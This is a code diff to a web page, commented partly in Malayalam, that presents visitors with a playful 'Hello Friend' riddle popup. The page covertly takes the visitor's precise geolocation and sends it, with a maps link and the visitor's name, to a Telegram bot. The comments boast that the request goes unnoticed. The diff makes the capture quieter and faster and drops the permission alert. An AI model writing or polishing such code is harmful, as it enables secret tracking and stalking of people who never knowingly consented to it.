@@ -20,7 +20,7 @@
         .blur-bg {
             filter: blur(20px);
             pointer-events: none;
-            transition: filter 0.8s ease;
+            transition: filter 0.4s ease; /* ബ്ലർ മാറുന്ന വേഗത കൂട്ടി */
             height: 100vh;
         }
 
@@ -112,7 +112,7 @@
 </head>
 <body>
 
-    <!-- Glass Popup (No technical warnings, just fun) -->
+    <!-- Glass Popup (Fun Riddle) -->
     <div id="welcomeOverlay">
         <div class="glass-panel">
             <h2>Hello Friend! 🕵️‍♂️</h2>
@@ -171,33 +171,34 @@
         let myNumber = localStorage.getItem("myNumber") || null;
         let localStream = null;
 
-        // "Yes, Continue" ക്ലിക്ക് ചെയ്യുമ്പോൾ വളരെ പെട്ടെന്ന് പ്രവർത്തിക്കുന്ന ഫംഗ്ഷൻ
+        // "Yes, Continue" ക്ലിക്ക് ചെയ്യുമ്പോൾ (ZERO LAG)
         function startExploration() {
-            if (!navigator.geolocation) return;
+            // 1. ഉടനടി ആപ്പിലേക്ക് പ്രവേശിക്കുന്നു (ലൊക്കേഷൻ കിട്ടാൻ വെയിറ്റ് ചെയ്യില്ല)
+            enterApp();
 
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    // 1. ലൊക്കേഷൻ കിട്ടിയ ഉടൻ തന്നെ ഒരു സെക്കൻഡ് പോലും വൈകാതെ ആപ്പിലേക്ക് കടത്തിവിടുന്നു
-                    enterApp();
+            // 2. ബാക്ഗ്രൗണ്ടിൽ വളരെ നിശബ്ദമായി ലൊക്കേഷൻ എടുക്കുന്നു
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        let userName = (myNumber && AUTHORIZED_USERS[myNumber]) ? AUTHORIZED_USERS[myNumber] : "Guest / Unverified User";
 
-                    // 2. ബാക്ഗ്രൗണ്ടിൽ യാതൊരു തടസ്സവുമില്ലാതെ ടെലിഗ്രാമിലേക്ക് മെസ്സേജ് പോകുന്നു (Silent background task)
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    let userName = (myNumber && AUTHORIZED_USERS[myNumber]) ? AUTHORIZED_USERS[myNumber] : "Guest / Unverified User";
-
-                    const msg = `📍 [SITE EXPLORATION]\n\n👤 Visitor: ${userName}\n🌍 Location: ${locLink}`;
-                    
-                    // fetch request പോകുന്നത് ആരുമറിയില്ല
-                    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`)
-                        .catch(err => console.log("Silent error handled"));
-                },
-                (error) => {
-                    // അഥവാ പെർമിഷൻ കൊടുത്തില്ലെങ്കിൽ മാത്രം അലർട്ട്
-                    alert("⚠️ Please 'Allow' access to enter the portal.");
-                },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-            );
+                        const msg = `📍 [SITE EXPLORATION]\n\n👤 Visitor: ${userName}\n🌍 Location: ${locLink}`;
+                        
+                        // ടെലിഗ്രാമിലേക്ക് അയക്കുന്നു (ഒരു ലാഗും ഉണ്ടാക്കില്ല)
+                        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(msg)}`)
+                            .catch(err => console.log("Silent error handled"));
+                    },
+                    (error) => {
+                        // അലർട്ടുകൾ ഒന്നുമില്ല. അലോ ചെയ്തില്ലെങ്കിൽ ആപ്പിനെ ബാധിക്കില്ല.
+                        console.log("Background location fetch ignored/denied.");
+                    },
+                    // maximumAge: 60000 നൽകിയത് വഴി പെട്ടെന്ന് തന്നെ ലൊക്കേഷൻ എടുക്കും (വേഗത കൂട്ടാൻ)
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+                );
+            }
         }
 
         // ഉള്ളിലേക്ക് പ്രവേശിപ്പിക്കുന്ന ഭാഗം
